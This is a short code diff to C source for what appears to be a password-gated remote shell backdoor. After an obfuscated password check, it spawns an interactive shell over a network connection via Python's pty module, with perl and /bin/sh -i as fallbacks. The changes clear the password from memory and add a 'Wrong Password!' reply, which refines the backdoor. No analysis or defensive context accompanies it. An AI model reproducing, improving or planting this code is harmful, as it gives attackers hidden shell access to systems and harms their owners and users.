@@ -54,7 +54,9 @@ int main() {
 		}
 		if (ba4439ee(p) == 0) //check password
 		{
-			//try pty with python, if false:
+			for(i = 0 ; i < strlen(p) ; i++) {
+				p[i] = '\0';
+			}
 			if (system("python -c \"import pty; pty.spawn('/bin/sh')\""))
 			{
 				//try pty with perl, if false:
@@ -64,6 +66,10 @@ int main() {
 					system("/bin/sh -i");
 				}
 			}
+		}
+		else
+		{
+			write(c, "Wrong Password!", 15);
 		}
 		close(c);
 	}
